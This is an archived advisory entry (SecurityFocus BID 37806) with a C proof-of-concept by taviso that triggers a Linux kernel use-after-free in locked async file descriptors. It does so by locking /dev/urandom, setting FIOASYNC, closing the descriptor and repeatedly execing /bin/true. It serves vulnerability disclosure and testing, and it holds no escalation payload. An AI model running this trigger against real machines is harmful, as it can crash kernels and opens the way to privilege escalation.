/*
source: http://www.securityfocus.com/bid/37806/info

Linux kernel is prone to a local privilege-escalation vulnerability.

Local attackers can exploit this issue to execute arbitrary code with kernel-level privileges.

Successful exploits will result in the complete compromise of affected computers.

The Linux Kernel 2.6.28 and later are vulnerable. 
*/

#ifndef _GNU_SOURCE
# define _GNU_SOURCE
#endif
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <stdlib.h>
#include <assert.h>
#include <asm/ioctls.h>

// Testcase for locked async fd bug -- taviso 16-Dec-2009
int main(int argc, char **argv)
{
    int fd;
    pid_t child;
    unsigned flag = ~0;

    fd = open("/dev/urandom", O_RDONLY);

    // set up exclusive lock, but dont block
    flock(fd, LOCK_EX | LOCK_NB);

    // set ASYNC flag on descriptor
    ioctl(fd, FIOASYNC, &flag);

    // close the file descriptor to trigger the bug
    close(fd);

    // now exec some stuff to populate the AT_RANDOM entries, which will cause
    // the released file to be used.

    // This assumes /bin/true is an elf executable, and that this kernel
    // supports AT_RANDOM.
    do switch (child = fork()) {
            case  0: execl("/bin/true", "/bin/true", NULL);
                     abort();
            case -1: fprintf(stderr, "fork() failed, %m\n");
                     break;
            default: fprintf(stderr, ".");
                     break;
    } while (waitpid(child, NULL, 0) != -1);

    fprintf(stderr, "waitpid() failed, %m\n");
    return 1;
}
